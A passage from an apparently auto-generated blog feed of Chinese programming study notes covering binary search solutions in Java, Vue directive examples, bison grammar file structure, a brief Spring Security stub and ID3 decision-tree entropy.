        <content type="html"><![CDATA[<h2 id="二分查找概况"><a href="#二分查找概况" class="headerlink" title="二分查找概况"></a>二分查找概况</h2><p><strong>二分查找的关键</strong></p><p><code>right=nums.length-1</code>搜索区间为<code>[left,right]</code>；所以判断条件应该使用<code>left&lt;=right</code>,一般是用来搜索确切的值，如果</p><p><code>right=nums.length</code>搜索区间为<code>[left,right)</code>；判断条件应该为<code>left&lt;right</code>，一般是用来搜索左右边界</p><h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><h4 id="35-搜索插入位置"><a href="#35-搜索插入位置" class="headerlink" title="35. 搜索插入位置"></a><a href="https://leetcode-cn.com/problems/search-insert-position/">35. 搜索插入位置</a></h4><img src="/2021/11/25/%E7%AE%97%E6%B3%95/%E7%AE%97%E6%B3%95-%E4%BA%8C%E5%88%86%E6%9F%A5%E6%89%BE/image-20211125163434187.png" class="lazyload" data-srcset="/2021/11/25/%E7%AE%97%E6%B3%95/%E7%AE%97%E6%B3%95-%E4%BA%8C%E5%88%86%E6%9F%A5%E6%89%BE/image-20211125163434187.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20211125163434187" style="zoom: 50%;"><p>从左往右开始搜索第一个严格大于target的数字，返回其下标，可以使用二分搜索的原因是：</p><p>如果<strong>nums[mid]&lt;target</strong>，则代表此时的mid的左边部分都是严格小于target，可以直接舍去，可以得到<code>l=mid+1</code>；</p><p>而如果<strong>nums[mid]&gt;target</strong>，则代表至少在mid~r这个区间内所有的元素都不是第一个大于target的，可得<code>r=mid</code>;</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">searchInsert</span><span class="params">(<span class="keyword">int</span>[] nums, <span class="keyword">int</span> target)</span> </span>&#123;</span><br><span class="line">        <span class="comment">//从左边开始 找出第一个严格大于target  如果小于就可以舍去左边的区间</span></span><br><span class="line">        <span class="keyword">int</span> l=<span class="number">0</span>,r=nums.length-<span class="number">1</span>;</span><br><span class="line">        <span class="keyword">if</span>(target&gt;nums[r])</span><br><span class="line">            <span class="keyword">return</span> r+<span class="number">1</span>;</span><br><span class="line">        <span class="keyword">while</span>(l&lt;r)&#123;</span><br><span class="line">            <span class="keyword">int</span> mid=l+((r-l)&gt;&gt;<span class="number">1</span>);</span><br><span class="line">            System.out.println(l+<span class="string">&quot; &quot;</span>+r+<span class="string">&quot; &quot;</span>+mid);</span><br><span class="line">            <span class="comment">//如果小于target</span></span><br><span class="line">            <span class="keyword">if</span>(nums[mid]&lt;target)&#123;</span><br><span class="line">                l=mid+<span class="number">1</span>;</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">               r=mid;</span><br><span class="line">            &#125;</span><br><span class="line">            </span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> l;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="704-二分查找"><a href="#704-二分查找" class="headerlink" title="704. 二分查找"></a><a href="https://leetcode-cn.com/problems/binary-search/">704. 二分查找</a></h4><p><strong>(寻找的是确切值的二分查找)</strong></p><p>对于该算法主要是搜索区间的问题，该搜索区间为<code>[0,len-1]</code>，所以条件应该为<code>&lt;=，l=mid+1，r=mid-1</code></p><img src="/2021/11/25/%E7%AE%97%E6%B3%95/%E7%AE%97%E6%B3%95-%E4%BA%8C%E5%88%86%E6%9F%A5%E6%89%BE/image-20211125163527891.png" class="lazyload" data-srcset="/2021/11/25/%E7%AE%97%E6%B3%95/%E7%AE%97%E6%B3%95-%E4%BA%8C%E5%88%86%E6%9F%A5%E6%89%BE/image-20211125163527891.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20211125163527891" style="zoom:50%;"><p><img src="/2021/11/25/%E7%AE%97%E6%B3%95/%E7%AE%97%E6%B3%95-%E4%BA%8C%E5%88%86%E6%9F%A5%E6%89%BE/image-20211125185836410.png" class="lazyload" data-srcset="/2021/11/25/%E7%AE%97%E6%B3%95/%E7%AE%97%E6%B3%95-%E4%BA%8C%E5%88%86%E6%9F%A5%E6%89%BE/image-20211125185836410.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20211125185836410"></p><p>对于上面搜索左边界的，如果nums[mid]&gt;=target，则代表[mid,right]可以全部舍去，由于是搜索区间是[left,right)，所以right=mid;</p><p><img src="/2021/11/25/%E7%AE%97%E6%B3%95/%E7%AE%97%E6%B3%95-%E4%BA%8C%E5%88%86%E6%9F%A5%E6%89%BE/image-20211125185813268.png" class="lazyload" data-srcset="/2021/11/25/%E7%AE%97%E6%B3%95/%E7%AE%97%E6%B3%95-%E4%BA%8C%E5%88%86%E6%9F%A5%E6%89%BE/image-20211125185813268.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20211125185813268"></p><p>对于上面搜索右编辑的，如果nums[mid]&lt;=target，则代表[left,mid]可以去全部舍去，而由于搜索区间是[left,right)，所以left=mid+1;</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>SpringBoot-SpringSecurity</title>
      <link href="/2021/11/24/SpringBoot/SpringBoot-SpringSecurity/"/>
      <url>/2021/11/24/SpringBoot/SpringBoot-SpringSecurity/</url>
      
        <content type="html"><![CDATA[<h1 id="SpringSecurity"><a href="#SpringSecurity" class="headerlink" title="SpringSecurity"></a>SpringSecurity</h1><img src="https://static001.geekbang.org/infoq/c4/c4cc590d82e0932157292111bf92dd4b.png" class="lazyload" data-srcset="https://static001.geekbang.org/infoq/c4/c4cc590d82e0932157292111bf92dd4b.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="img" style="zoom:67%;"><p> springsecurity最重要的两个部分: <strong>authentication(认证) 和 authorization(授权)</strong></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>Vue-网络应用</title>
      <link href="/2021/11/17/Vue-%E7%BD%91%E7%BB%9C%E5%BA%94%E7%94%A8/"/>
      <url>/2021/11/17/Vue-%E7%BD%91%E7%BB%9C%E5%BA%94%E7%94%A8/</url>
      
        <content type="html"><![CDATA[<img src="/2021/11/17/Vue-%E7%BD%91%E7%BB%9C%E5%BA%94%E7%94%A8/image-20211117123308087.png" class="lazyload" data-srcset="/2021/11/17/Vue-%E7%BD%91%E7%BB%9C%E5%BA%94%E7%94%A8/image-20211117123308087.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20211117123308087" style="zoom:50%;">]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>Vue快速入门</title>
      <link href="/2021/11/16/Vue%E5%BF%AB%E9%80%9F%E5%85%A5%E9%97%A8/"/>
      <url>/2021/11/16/Vue%E5%BF%AB%E9%80%9F%E5%85%A5%E9%97%A8/</url>
      
        <content type="html"><![CDATA[<h1 id="入门语法"><a href="#入门语法" class="headerlink" title="入门语法"></a>入门语法</h1><img src="/2021/11/16/Vue%E5%BF%AB%E9%80%9F%E5%85%A5%E9%97%A8/image-20211116191616171.png" class="lazyload" data-srcset="/2021/11/16/Vue%E5%BF%AB%E9%80%9F%E5%85%A5%E9%97%A8/image-20211116191616171.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20211116191616171" style="zoom: 67%;"><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;https://cdn.jsdelivr.net/npm/vue@2/dist/vue.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><h2 id="Vue指令绑定"><a href="#Vue指令绑定" class="headerlink" title="Vue指令绑定"></a>Vue指令绑定</h2><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;app&quot;</span>&gt;</span></span><br><span class="line">        <span class="comment">&lt;!-- v-text指令绑定 --&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">h2</span> <span class="attr">v-text</span>=<span class="string">&quot;message&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">h2</span>&gt;</span>插值绑定&#123;&#123;message&#125;&#125;<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;https://cdn.jsdelivr.net/npm/vue@2/dist/vue.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript"></span></span><br><span class="line"><span class="javascript">        <span class="keyword">var</span> app = <span class="keyword">new</span> Vue(&#123;</span></span><br><span class="line"><span class="javascript">            <span class="attr">el</span>: <span class="string">&quot;#app&quot;</span>,</span></span><br><span class="line"><span class="javascript">            <span class="attr">data</span>: &#123;</span></span><br><span class="line"><span class="javascript">                <span class="attr">message</span>: <span class="string">&quot;数据&quot;</span></span></span><br><span class="line"><span class="javascript">            &#125;</span></span><br><span class="line"><span class="javascript">        &#125;)</span></span><br><span class="line"><span class="javascript">    </span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br></pre></td></tr></table></figure><h3 id="v-text-设置文本"><a href="#v-text-设置文本" class="headerlink" title="v-text:设置文本"></a>v-text:设置文本</h3><h3 id="v-html-可以设置具体的html结构，可以被解析出来"><a href="#v-html-可以设置具体的html结构，可以被解析出来" class="headerlink" title="v-html:可以设置具体的html结构，可以被解析出来"></a>v-html:可以设置具体的html结构，可以被解析出来</h3><p><img src="/2021/11/16/Vue%E5%BF%AB%E9%80%9F%E5%85%A5%E9%97%A8/image-20211116193348951.png" class="lazyload" data-srcset="/2021/11/16/Vue%E5%BF%AB%E9%80%9F%E5%85%A5%E9%97%A8/image-20211116193348951.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20211116193348951"><img src="/2021/11/16/Vue%E5%BF%AB%E9%80%9F%E5%85%A5%E9%97%A8/image-20211116193340709.png" class="lazyload" data-srcset="/2021/11/16/Vue%E5%BF%AB%E9%80%9F%E5%85%A5%E9%97%A8/image-20211116193340709.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20211116193340709" style="zoom:67%;"></p><h3 id="v-on-为元素绑定事件"><a href="#v-on-为元素绑定事件" class="headerlink" title="v-on:为元素绑定事件"></a>v-on:为元素绑定事件</h3><p>将函数写在绑定Vue对象李methods中</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;app&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;button&quot;</span> <span class="attr">value</span>=<span class="string">&quot;事件绑定&quot;</span> <span class="attr">v-on:click</span>=<span class="string">&quot;click1&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;button&quot;</span> <span class="attr">value</span>=<span class="string">&quot;双击&quot;</span> @<span class="attr">dblclick</span>=<span class="string">&quot;click1&quot;</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- 使用v-on --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;https://cdn.jsdelivr.net/npm/vue@2/dist/vue.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript"></span></span><br><span class="line"><span class="javascript">    <span class="keyword">var</span> app = <span class="keyword">new</span> Vue(&#123;</span></span><br><span class="line"><span class="javascript">        <span class="attr">el</span>: <span class="string">&quot;#app&quot;</span>,</span></span><br><span class="line"><span class="javascript">        <span class="attr">methods</span>: &#123;</span></span><br><span class="line"><span class="javascript">            <span class="attr">click1</span>: <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span></span><br><span class="line"><span class="javascript">                alert(<span class="string">&quot;你好啊&quot;</span>);</span></span><br><span class="line"><span class="javascript">            &#125;</span></span><br><span class="line"><span class="javascript">        &#125;</span></span><br><span class="line"><span class="javascript">    &#125;)</span></span><br><span class="line"><span class="javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><p>可以使用简写，比如<code>v-on:dblclick==@dblclick</code></p><h3 id="v-if-和-v-show的区别"><a href="#v-if-和-v-show的区别" class="headerlink" title="v-if 和 v-show的区别"></a>v-if 和 v-show的区别</h3><p>都为判断真假是否显示，但是v-if操作的是dom元素，而v-show操作的是display元素</p><h3 id="v-bind"><a href="#v-bind" class="headerlink" title="v-bind"></a>v-bind</h3><p>绑定dom的属性</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;app&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">img</span> <span class="attr">v-bind:src</span>=<span class="string">&quot;imgsrc&quot;</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- 有设置titile --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">img</span> <span class="attr">v-bind:src</span>=<span class="string">&quot;imgsrc&quot;</span> <span class="attr">v-bind:title</span>=<span class="string">&quot;imgtitle+&#x27;!!!!&#x27;&quot;</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- 设置判断真假 用对象的形式或者使用三元表达式--&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">img</span> <span class="attr">v-bind:src</span>=<span class="string">&quot;imgsrc&quot;</span> <span class="attr">v-bind:title</span>=<span class="string">&quot;imgtitle+&#x27;!!!!&#x27;&quot;</span> <span class="attr">v-bind:class</span>=<span class="string">&quot;&#123;boder:isactive&#125;&quot;</span> @<span class="attr">dblclick</span>=<span class="string">&quot;click1&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;https://cdn.jsdelivr.net/npm/vue@2/dist/vue.js &quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript"></span></span><br><span class="line"><span class="javascript">    app = <span class="keyword">new</span> Vue(&#123;</span></span><br><span class="line"><span class="javascript">        <span class="attr">el</span>: <span class="string">&quot;#app &quot;</span>,</span></span><br><span class="line"><span class="javascript">        <span class="attr">data</span>: &#123;</span></span><br><span class="line"><span class="javascript">            <span class="attr">imgsrc</span>: <span class="string">&quot;./img.png &quot;</span>,</span></span><br><span class="line"><span class="javascript">            <span class="attr">imgtitle</span>: <span class="string">&quot;nihaoa &quot;</span>,</span></span><br><span class="line"><span class="javascript">            <span class="attr">isactive</span>: <span class="literal">false</span></span></span><br><span class="line"><span class="javascript">        &#125;,</span></span><br><span class="line"><span class="javascript">        <span class="attr">methods</span>: &#123;</span></span><br><span class="line"><span class="javascript">            <span class="attr">click1</span>: <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span></span><br><span class="line"><span class="javascript">                <span class="built_in">this</span>.isactive = !<span class="built_in">this</span>.isactive</span></span><br><span class="line"><span class="javascript">            &#125;</span></span><br><span class="line"><span class="javascript">        &#125;</span></span><br><span class="line"><span class="javascript"></span></span><br><span class="line"><span class="javascript">    &#125;)</span></span><br><span class="line"><span class="javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><h3 id="v-for"><a href="#v-for" class="headerlink" title="v-for"></a>v-for</h3><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!-- 测试 v-for --&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;app&quot;</span>&gt;</span></span><br><span class="line">       <span class="tag">&lt;<span class="name">li</span> <span class="attr">v-for</span>=<span class="string">&quot;item in array&quot;</span>&gt;</span>&#123;&#123;item&#125;&#125;<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;https://cdn.jsdelivr.net/npm/vue@2/dist/vue.js &quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript"></span></span><br><span class="line"><span class="javascript">       app = <span class="keyword">new</span> Vue(&#123;</span></span><br><span class="line"><span class="javascript">           <span class="attr">el</span>: <span class="string">&quot;#app&quot;</span>,</span></span><br><span class="line"><span class="javascript">           <span class="attr">data</span>: &#123;</span></span><br><span class="line"><span class="javascript">               <span class="attr">array</span>: [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>],</span></span><br><span class="line"><span class="javascript">           &#125;</span></span><br><span class="line"><span class="javascript">       &#125;)</span></span><br><span class="line"><span class="javascript">   </span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><h3 id="v-model"><a href="#v-model" class="headerlink" title="v-model"></a>v-model</h3><img src="/2021/11/16/Vue%E5%BF%AB%E9%80%9F%E5%85%A5%E9%97%A8/image-20211117121304006.png" class="lazyload" data-srcset="/2021/11/16/Vue%E5%BF%AB%E9%80%9F%E5%85%A5%E9%97%A8/image-20211117121304006.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20211117121304006" style="zoom: 50%;">]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>bison的使用</title>
      <link href="/2021/11/14/%E7%BC%96%E8%AF%91%E4%B8%8E%E5%8F%8D%E7%BC%96%E8%AF%91/bison%E7%9A%84%E4%BD%BF%E7%94%A8/"/>
      <url>/2021/11/14/%E7%BC%96%E8%AF%91%E4%B8%8E%E5%8F%8D%E7%BC%96%E8%AF%91/bison%E7%9A%84%E4%BD%BF%E7%94%A8/</url>
      
        <content type="html"><![CDATA[<h1 id="bison自定义语法文件"><a href="#bison自定义语法文件" class="headerlink" title="bison自定义语法文件"></a>bison自定义语法文件</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">%&#123;</span><br><span class="line">Declarations</span><br><span class="line">%&#125;</span><br><span class="line">Definitions</span><br><span class="line">%%</span><br><span class="line">Productions</span><br><span class="line">%%</span><br><span class="line">User subroutines</span><br></pre></td></tr></table></figure><p>其中的 Declarations 段和 User subroutines 和 flex 文件中是一样的， bison 会将这些代码原样的拷贝到 y.tab.c 文件中； Definitions 段和 flex 中的功能也差不多，也是在这个段定义一些 bison 专有的变量，稍后再解释这个文件中的这个段里的代码；<strong>最重要的是 Productions 段</strong></p><h1 id="Productions段"><a href="#Productions段" class="headerlink" title="Productions段"></a>Productions段</h1><p>bison 将根据自定义语法文件生成一个函数 <strong>int yyparse (void)</strong> （在 y.tab.c 文件中），该函数按 LR(1) 解析流程对词法分析得到的 token stream 进行解析，每当它需要读入下一个符号时，它就执行一次 <strong>x = yylex()</strong> ，每当它要执行一个折叠动作时，这个折叠动作所应用的产生式后面的花括号里面的 C 代码将被执行，执行完后才将相应的状态出栈。</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>机器学习-决策树ID3</title>
      <link href="/2021/11/12/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0-%E5%86%B3%E7%AD%96%E6%A0%91ID3/"/>
      <url>/2021/11/12/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0-%E5%86%B3%E7%AD%96%E6%A0%91ID3/</url>
      
        <content type="html"><![CDATA[<h1 id="决策树的一般流程"><a href="#决策树的一般流程" class="headerlink" title="决策树的一般流程"></a>决策树的一般流程</h1><ul><li>（1） 收集数据：可以使用任何方法</li><li>（2） 准备数据：树构造算法只适用于标称型数据，因此数值型数据必须离散化</li><li>（3） 分析数据：可以使用任何方法，构造树完成之后，我们应该检查图像是否符合预期</li><li>（4） 训练算法：构造树的数据结构</li><li>（5） 测试算法：使用经验树计算错误率</li><li>（6）使用算法：此步骤可以适用于任何监督学习算法，而使用决策树可以更好的理解数据的内在含义</li></ul><h2 id="划分特征"><a href="#划分特征" class="headerlink" title="划分特征"></a>划分特征</h2><p>如果一个对象具有多个特征，那么将那个特征作为第一个划分数据集的标准，需要有一个指标来衡量，在划分数据集之前之后信息发生的变化成为信息增益，知道如何计算信息增益，我们就可以计算每个特征值划分数据集获得的信息增益，获得信息增益最高的特征就是最好的选择。</p><p>熵定义为信息的期望值，在明白这个概念之前，我们必须知道信息的定义，如果待分类的事务可能划分在多个分类之中，则符号Xi的信息定义为：</p><img src="/2021/11/12/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0-%E5%86%B3%E7%AD%96%E6%A0%91ID3/image-20211112115615393.png" class="lazyload" data-srcset="/2021/11/12/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0-%E5%86%B3%E7%AD%96%E6%A0%91ID3/image-20211112115615393.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20211112115615393" style="zoom:67%;"><img src="/2021/11/12/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0-%E5%86%B3%E7%AD%96%E6%A0%91ID3/image-20211112120323528.png" class="lazyload" data-srcset="/2021/11/12/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0-%E5%86%B3%E7%AD%96%E6%A0%91ID3/image-20211112120323528.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20211112120323528" style="zoom:67%;"><p>其中n是分类的种类个数</p><p><em>计算的结果熵是度量数据集合的无序性</em></p><h2 id="划分数据集合"><a href="#划分数据集合" class="headerlink" title="划分数据集合"></a>划分数据集合</h2><p>根据上面计算的信息熵来划分数据集合，对每个特征划分数据集的结果计算一次信息熵，然后判断按照哪个特征划分数据集是最好的划分，如果信息熵越大，则代表分类效果越好，则该特征越容易区分</p><h2 id="递归构建决策树"><a href="#递归构建决策树" class="headerlink" 